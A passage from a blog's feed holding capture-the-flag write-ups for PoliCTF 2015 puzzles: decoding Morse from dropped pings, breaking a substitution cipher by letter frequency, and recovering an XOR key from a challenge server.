</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;spdgj&quot;</span><span class="o">,</span> <span class="s">&quot;yb%e&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using this string, I started working my way back, applying all the operations of <code>a.java</code>, <code>b.java</code> and <code>c.java</code> by hand. Finally, I ended up with the string <code>flag{Maybe_This_Obfuscation_Was_Not_That_Good_As_We_Thought}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John the Dropper]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-john-the-dropper/"/>
    <updated>2015-07-12T12:00:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-john-the-dropper</id>
    <content type="html"><![CDATA[<p>John the Dropper was an interesting 100 point challenge. I&rsquo;d love to see how it was implemented!</p>

<!--more-->


<p>We&rsquo;re given a host, <code>dropper.polictf.it</code>. It has no open ports, but the challenge description mentioned that John did not need ports to communicate. I left this challenge for a while, focusing on others. When I got back, superkojiman noticed that pinging this host dropped a lot of packets. He saw patterns: sometimes one packet dropped, sometimes three in a row. This made me think of Morse immediately.</p>

<p>I started pinging the host and grabbed the output of <code>ping</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PING dropper.polictf.it (52.18.119.20) 56(84) bytes of data.
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=1 ttl=50 time=23.8 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=3 ttl=50 time=24.2 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=5 ttl=50 time=24.1 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=7 ttl=50 time=23.8 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=8 ttl=50 time=23.9 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=12 ttl=50 time=23.8 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=16 ttl=50 time=24.2 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=20 ttl=50 time=23.9 ms
</span><span class='line'>64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=21 ttl=50 time=24.0 ms
</span><span class='line'>...snip...</span></code></pre></td></tr></table></div></figure>


<p>As you can see, request 2, 4 and 6 are dropped. With the following one-liner, I extracted the icmp_req numbers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat pings.txt <span class="p">|</span>awk <span class="s1">&#39;{print $6}&#39;</span> <span class="p">|</span>awk <span class="s1">&#39;{split($0,a,&quot;=&quot;); print a[2]}&#39;</span> &gt; sequence.txt
</span></code></pre></td></tr></table></div></figure>


<p>I wrote a python script to translate the drops to Morse:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">seq</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;sequence.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span><span class='line'>      <span class="n">seq</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">l</span><span class="p">))</span>
</span><span class='line'>  <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">msg</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="n">count</span> <span class="o">+=</span> <span class="s">&#39; &#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>      <span class="n">msg</span> <span class="o">+=</span> <span class="s">&#39;.&#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
</span><span class='line'>      <span class="n">msg</span> <span class="o">+=</span> <span class="s">&#39;-&#39;</span>
</span><span class='line'><span class="k">print</span> <span class="n">msg</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which yielded:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">...</span> <span class="o">---</span> <span class="o">...</span>    <span class="o">-</span> <span class="o">....</span> <span class="o">..</span> <span class="o">...</span>    <span class="o">..</span> <span class="o">...</span>    <span class="o">-</span> <span class="o">....</span> <span class="o">.</span>    <span class="o">..-.</span> <span class="o">.-..</span> <span class="o">.-</span> <span class="o">--.</span> <span class="o">.--.-</span> <span class="o">..</span> <span class="o">-</span> <span class="o">-....-</span> <span class="o">..</span> <span class="o">...</span> <span class="o">-....-</span> <span class="o">-.</span> <span class="o">.</span> <span class="o">...-</span> <span class="o">.</span> <span class="o">.-.</span> <span class="o">-....-</span> <span class="o">-</span> <span class="o">---</span> <span class="o">---</span> <span class="o">-....-</span> <span class="o">.-..</span> <span class="o">.-</span> <span class="o">-</span> <span class="o">.</span> <span class="o">-....-</span> <span class="o">..-.</span> <span class="o">---</span> <span class="o">.-.</span> <span class="o">-....-</span> <span class="o">.-</span> <span class="o">-....-</span> <span class="o">-..</span> <span class="o">.-.</span> <span class="o">---</span> <span class="o">.--.</span> <span class="o">.--.--</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first three characters spell out &ldquo;SOS&rdquo;. I translated the rest by hand and found: <code>SOS THIS IS THE FLAG?IT?IS?NEVER?TOO?LATE?FOR?A?DROP?</code>. I couldn&rsquo;t really figure out the characters that are marked <code>?</code>. I guessed them to be underscores, but in the end, <a href="https://duckduckgo.com/?q=...+---+...++++-+....+..+...++++..+...++++-+....+.++++..-.+.-..+.-+--.+.--.-+..+-+-....-+..+...+-....-+-.+.+...-+.+.-.+-....-+-+---+---+-....-+.-..+.-+-+.+-....-+..-.+---+.-.+-....-+.-+-....-+-..+.-.+---+.--.+.--.--++++morse&amp;ia=answer">duckduckgo</a> came to the rescue. The final flag was lowercase: <code>flag{it-is-never-too-late-for-a-drop}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - and the Prophet Said]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-and-the-prophet-said/"/>
    <updated>2015-07-12T11:47:44+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-and-the-prophet-said</id>
    <content type="html"><![CDATA[<p>After solving the first crypto challenge of PoliCTF 2015, I moved onto the 100 point challenge.</p>

<!--more-->


<p>The download contains a text file with base64-encoded data, which becomes a .gz archive. After decompressing, I obtained a text file with biblical text. Not my cup of tea, but I immediately saw that certain sentences were duplicated. I wrote a python script to count the occurences of lines:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;text-file&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
</span><span class='line'>          <span class="n">d</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="n">d</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">d</span><span class="o">.</span><span class="n">get</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">w</span><span class="p">,</span> <span class="n">d</span><span class="p">[</span><span class="n">w</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which gave me these frequencies:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...snip...
</span><span class='line'>Ye shall not eat anything with the blood: neither shall ye use enchantments, nor practise augury.
</span><span class='line'>21
</span><span class='line'>And ye shall keep my statutes, and <span class="k">do</span> them: I am Jehovah who sanctifieth you.
</span><span class='line'>23
</span><span class='line'>And <span class="k">if</span> a man lie with a beast, he shall surely be put to death: and ye shall slay the beast.
</span><span class='line'>26
</span><span class='line'>And when he hath made an end of atoning <span class="k">for</span> the holy place, and the tent of meeting, and the altar, he shall present the live goat:
</span><span class='line'>47
</span></code></pre></td></tr></table></div></figure>


<p>A total of 30 distinct strings were found. I guessed these strings represented letters, so I extended the python script a bit and started puzzling:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">d</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;text-file&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">d</span><span class="p">:</span>
</span><span class='line'>          <span class="n">d</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>          <span class="n">d</span><span class="p">[</span><span class="n">l</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">d</span><span class="o">.</span><span class="n">get</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">w</span><span class="p">,</span> <span class="n">d</span><span class="p">[</span><span class="n">w</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>  
</span><span class='line'><span class="n">x</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="nb">zip</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="n">d</span><span class="o">.</span><span class="n">get</span><span class="p">,</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="s">&#39; etaoinsrhldcubkfgjmpqvwxyz012&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># transpose the strings to letters and print out the message</span>
</span><span class='line'><span class="n">out</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span><span class='line'>  <span class="n">out</span> <span class="o">+=</span> <span class="n">x</span><span class="p">[</span><span class="n">l</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">print</span> <span class="n">out</span>
</span></code></pre></td></tr></table></div></figure>


<p>I guessed that the most common string was a space, which indeed yielded word- and sentence-like output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">rtiisq</span> <span class="n">eroa</span> <span class="n">grniitlht</span> <span class="n">oa</span> <span class="n">wtdc</span> <span class="n">tnac</span> <span class="n">oalje</span> <span class="n">oe1</span> <span class="n">ojk</span> <span class="n">edcolh</span> <span class="n">es</span> <span class="n">bdoet</span> <span class="n">n</span> <span class="n">islh</span> <span class="n">ktaanht</span> <span class="k">as</span> <span class="n">aeneoaeoga</span> <span class="n">boii</span> <span class="n">rtip</span> <span class="n">csf</span> <span class="n">boer</span> <span class="n">ert</span> <span class="n">iteetd</span> <span class="n">mdtxftlgotav</span> <span class="n">ufe</span> <span class="n">ojk</span> <span class="n">lse</span> <span class="n">dtniic</span> <span class="n">hssy</span> <span class="n">ne</span> <span class="n">ernev</span> <span class="n">s0</span> <span class="n">erneja</span> <span class="n">tlsfhrq</span> <span class="n">nrnrq</span> <span class="n">ojk</span> <span class="n">ol</span> <span class="n">iswt</span> <span class="n">boer</span> <span class="n">aokpit</span> <span class="n">isbtdgnat</span> <span class="n">minha</span> <span class="n">boersfe</span> <span class="n">apngta</span> <span class="n">nly</span> <span class="n">aednlht</span> <span class="n">ackusiav</span> <span class="n">minhziureuhhfwmacleuuxbus2</span>
</span></code></pre></td></tr></table></div></figure>


<p>I then started to look for THE, THIS, A, AND to guess the first couple of letters:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Heoosq</span> <span class="n">THIS</span> <span class="n">gHnooelre</span> <span class="n">IS</span> <span class="n">wedc</span> <span class="n">enSc</span> <span class="n">ISljT</span> <span class="n">IT1</span> <span class="n">Ijk</span> <span class="n">TdcIlr</span> <span class="n">Ts</span> <span class="n">bdITe</span> <span class="n">n</span> <span class="n">oslr</span> <span class="n">keSSnre</span> <span class="n">Ss</span> <span class="n">STnTISTIgS</span> <span class="n">bIoo</span> <span class="n">Heop</span> <span class="n">csf</span> <span class="n">bITH</span> <span class="n">THe</span> <span class="n">oeTTed</span> <span class="n">mdexfelgIeSv</span> <span class="n">ufT</span> <span class="n">Ijk</span> <span class="n">lsT</span> <span class="n">denooc</span> <span class="n">rssy</span> <span class="n">nT</span> <span class="n">THnTv</span> <span class="n">s0</span> <span class="n">THnTjS</span> <span class="n">elsfrHq</span> <span class="n">nHnHq</span> <span class="n">Ijk</span> <span class="n">Il</span> <span class="n">oswe</span> <span class="n">bITH</span> <span class="n">SIkpoe</span> <span class="n">osbedgnSe</span> <span class="n">monrS</span> <span class="n">bITHsfT</span> <span class="n">SpngeS</span> <span class="n">nly</span> <span class="n">STdnlre</span> <span class="n">SckusoSv</span> <span class="n">monrzouHTurrfwmSclTuuxbus2</span>
</span></code></pre></td></tr></table></div></figure>


<p>Slowly but surely, I translated all the letters, and the words slowly emerged (I love that!):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">HEoonq</span> <span class="n">THIS</span> <span class="n">gHAooEldE</span> <span class="n">IS</span> <span class="n">VERY</span> <span class="n">EASY</span> <span class="n">ISljT</span> <span class="n">IT1</span> <span class="n">Ijk</span> <span class="n">TRYIld</span> <span class="n">Tn</span> <span class="n">WRITE</span> <span class="n">A</span> <span class="n">onld</span> <span class="n">kESSAdE</span> <span class="n">Sn</span> <span class="n">STATISTIgS</span> <span class="n">WIoo</span> <span class="n">HEop</span> <span class="n">Ynf</span> <span class="n">WITH</span> <span class="n">THE</span> <span class="n">oETTER</span> <span class="n">mRExfElgIESb</span> <span class="n">ufT</span> <span class="n">Ijk</span> <span class="n">lnT</span> <span class="n">REAooY</span> <span class="n">dnnc</span> <span class="n">AT</span> <span class="n">THATb</span> <span class="n">n0</span> <span class="n">THATjS</span> <span class="n">ElnfdHq</span> <span class="n">AHAHq</span> <span class="n">Ijk</span> <span class="n">Il</span> <span class="n">onVE</span> <span class="n">WITH</span> <span class="n">SIkpoE</span> <span class="n">onWERgASE</span> <span class="n">moAdS</span> <span class="n">WITHnfT</span> <span class="n">SpAgES</span> <span class="n">Alc</span> <span class="n">STRAldE</span> <span class="n">SYkunoSb</span> <span class="n">moAdzouHTuddfVmSYlTuuxWun2</span>
</span><span class='line'>
</span><span class='line'><span class="n">HELLoq</span> <span class="n">THIS</span> <span class="n">CHALLENGE</span> <span class="n">IS</span> <span class="n">VERY</span> <span class="n">EASY</span> <span class="n">ISN</span><span class="s">&#39;T IT? I&#39;</span><span class="n">k</span> <span class="n">TRYING</span> <span class="n">To</span> <span class="n">WRITE</span> <span class="n">A</span> <span class="n">LoNG</span> <span class="n">kESSAGE</span> <span class="n">So</span> <span class="n">STATISTICS</span> <span class="n">WILL</span> <span class="n">HELp</span> <span class="n">Yof</span> <span class="n">WITH</span> <span class="n">THE</span> <span class="n">LETTER</span> <span class="n">mRExfENCIESb</span> <span class="n">ufT</span> <span class="n">I</span><span class="s">&#39;k NoT REALLY Good AT THATb oj THAT&#39;</span><span class="n">S</span> <span class="n">ENofGHq</span> <span class="n">AHAHq</span> <span class="n">I</span><span class="s">&#39;k IN LoVE WITH SIkpLE LoWERCASE mLAGS WITHofT SpACES ANd STRANGE SYkuoLSb mLAGzLuHTuGGfVmSYNTuuxWuo2</span>
</span><span class='line'>
</span><span class='line'><span class="n">HELLOq</span> <span class="n">THIS</span> <span class="n">CHALLENGE</span> <span class="n">IS</span> <span class="n">VERY</span> <span class="n">EASY</span> <span class="n">ISN</span><span class="s">&#39;T IT? I&#39;</span><span class="n">M</span> <span class="n">TRYING</span> <span class="n">TO</span> <span class="n">WRITE</span> <span class="n">A</span> <span class="n">LONG</span> <span class="n">MESSAGE</span> <span class="n">SO</span> <span class="n">STATISTICS</span> <span class="n">WILL</span> <span class="n">HELP</span> <span class="n">YOU</span> <span class="n">WITH</span> <span class="n">THE</span> <span class="n">LETTER</span> <span class="n">kRExUENCIESb</span> <span class="n">uUT</span> <span class="n">I</span><span class="s">&#39;M NOT REALLY GOOd AT THATb Oj THAT&#39;</span><span class="n">S</span> <span class="n">ENOUGHq</span> <span class="n">AHAHq</span> <span class="n">I</span><span class="s">&#39;M IN LOVE WITH SIMPLE LOWERCASE kLAGS WITHOUT SPACES ANd STRANGE SYMuOLSb kLAGzLuHTuGGUVkSYNTuuxWuO2</span>
</span><span class='line'>
</span><span class='line'><span class="n">HELLO</span><span class="err">!</span> <span class="n">THIS</span> <span class="n">CHALLENGE</span> <span class="n">IS</span> <span class="n">VERY</span> <span class="n">EASY</span> <span class="n">ISN</span><span class="s">&#39;T IT? I&#39;</span><span class="n">M</span> <span class="n">TRYING</span> <span class="n">TO</span> <span class="n">WRITE</span> <span class="n">A</span> <span class="n">LONG</span> <span class="n">MESSAGE</span> <span class="n">SO</span> <span class="n">STATISTICS</span> <span class="n">WILL</span> <span class="n">HELP</span> <span class="n">YOU</span> <span class="n">WITH</span> <span class="n">THE</span> <span class="n">LETTER</span> <span class="n">FREQUENCIES</span><span class="p">,</span> <span class="n">BUT</span> <span class="n">I</span><span class="s">&#39;M NOT REALLY GOOD AT THAT, OK THAT&#39;</span><span class="n">S</span> <span class="n">ENOUGH</span><span class="err">!</span> <span class="n">AHAH</span><span class="err">!</span> <span class="n">I</span><span class="s">&#39;M IN LOVE WITH SIMPLE LOWERCASE FLAGS WITHOUT SPACES AND STRANGE SYMBOLS, FLAG{LBHTBGGUVFSYNTBBQWBO}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The final translation dictionary was: <code>x = dict(zip(sorted(d, key=d.get, reverse=True), " TESILAOHGNRYBWMUC'FP!,VQD{K?}"))</code>
The challenge already said that the flag needed a bit more work. Indeed, <code>flag{lbhtbgguvfsyntbbqwbo}</code> was not accepted. What then? Bitvijays suggested that the flag was another &ldquo;ciphertext&rdquo;, so I thought of Caesar cipher. The easiest is <a href="http://rot13.com">rot13</a> and indeed, the flag was <code>flag{yougotthisflagoodjob}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Exorcise]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-exorcise/"/>
    <updated>2015-07-12T11:39:10+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-exorcise</id>
    <content type="html"><![CDATA[<p>Exorcise was a 50 point crypto challenge for PoliCTF.</p>

<!--more-->


<p>We&rsquo;re asked to connect to <code>exorcise.polictf.it:80</code>. Upon connecting, we&rsquo;re presented with a hexadecimal string. I pressed return and got another:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc exorcise.polictf.it 80
</span><span class='line'>2e0540472c37151c4e007f481c2a0110311204084f
</span><span class='line'>
</span><span class='line'>2e0541495b161248101c2a11122d16102d1608091902027f0d071c2c53050a061f05380d410f0a2a531f1e1907053d3310543e5d1c3a512653020c09461809025b341111475310451b3a014736000c4d0404002c1c4f142d164805001f107f094114103110074c190344283a00063b110c26413a00
</span></code></pre></td></tr></table></div></figure>


<p>Because of the challenge title, I xor&#8217;ed the second string using the first as a key and got gibberish. I decided to reconnect and send a bunch of NULL bytes (Ctrl+Space). When I xor&#8217;ed that string against the first, I got this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>What<span class="s1">&#39;s your name^i%UX`C=h=pN^xPdaW]j,1ISJC&#39;</span>t yru4OBwguHi! What<span class="err">&#39;</span>s your name^G
</span></code></pre></td></tr></table></div></figure>


<p>Hmmmmm. I reconnected again, sent a bunch of A characters and the resulting string was xor&#8217;ed vs 0x41:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">e</span> <span class="o">=</span> <span class="s">&quot;2e0541263a1e352928321e70321e32711e32282c312d241e382e341e32292e342d251e292037241e322e2d3724251e1e28351e702f1e741e3224223c272d20263a1e352928321e70321e32711e32282c312d241e382e341e32292e342d251e292037241e322e2d3724251e1e28351e702f1e741e3224223c272d2026557f3d0e490a3044533e01557f010c0c14050b38591b1d36004802101f173e0f04561c30064f1c040a063e3d050d7f50022d503b0a450412124c150f1e7f1f0d105d7f7e07371642281a1a0850180d3a0a0a553e010d4f1f19172b480056072a1d0c04560a027f280c1d2d554e3d4c2b1616&quot;</span>
</span><span class='line'><span class="n">msg</span> <span class="o">=</span> <span class="p">[</span><span class="n">e</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">start</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">start</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="mi">2</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'><span class="n">out</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span>
</span><span class='line'>  <span class="n">out</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x41</span><span class="o">^</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">out</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/exorcise<span class="nv">$ </span>python exorcise.py
</span><span class='line'>oDg<span class="o">{</span>_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec<span class="o">}</span>flag<span class="o">{</span>_this_1s_s0_simple_you_should_have_solved__it_1n_5_sec<span class="o">}</span>flag
</span></code></pre></td></tr></table></div></figure>


